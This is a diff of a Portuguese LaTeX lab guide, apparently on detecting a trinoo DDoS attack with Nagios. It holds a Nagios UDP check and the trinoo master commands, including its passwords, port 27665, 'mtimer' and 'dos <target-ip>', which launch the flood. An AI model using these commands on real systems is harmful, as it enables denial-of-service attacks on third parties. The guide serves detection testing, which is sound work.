@@ -143,14 +143,14 @@ ele coleta a partir das suas configurações padrão.
 Para que o \Nagios\ detecte corretamente um ataque DDoS do \trinoo\ é necessário adicionar as
 seguintes linhas ao arquivo \emph{/etc/nagios3/conf.d/localhost\_nagios2.cfg}:
 
-\cbox{
-define service\{
-        use                    generic-service
-        host\_name             localhost
-        service\_description   UDP
-        check\_command         check\_udp!22
-        \}
-}
+\begin{verbatim}
+define service{
+        use                   generic-service
+        host_name             localhost
+        service_description   UDP
+        check_command         check_udp!22
+        }
+\end{verbatim}
 
 Desta forma, quando um ataque DDoS estiver em execução, o \Nagios\ irá acusar falha no serviço,
 aumento de latência e/ou perda de pacotes.
@@ -190,19 +190,22 @@ Então cada zumbi terá de ser iniciado executando o cliente \trinoo\ no computa
 
 Para se iniciar o \trinoo\ mestre:
 
-\cbox{\$\ master/master
-?? g0rave}
+\begin{verbatim}
+$ master/master
+?? g0rave
+\end{verbatim}
 
 Agora, no computador com o mestre, lance o ataque:
 
-\cbox{\$\ telnet <ip-do-mestre> 27665
+\begin{verbatim}
+$ telnet <ip-do-mestre> 27665
 Trying 127.0.0.1...
 Connected to localhost.
-Escape character is '\^\ $]$'.
+Escape character is '^]'.
 betaalmostdone
 mtimer <tempo-do-ataque>
 dos <ip-do-alvo>
-}
+\end{verbatim}
 
 Neste momento os zumbis devem começar o ataque ao IP do alvo, o que deve ser identificado através
 do monitoramento do \Nagios.
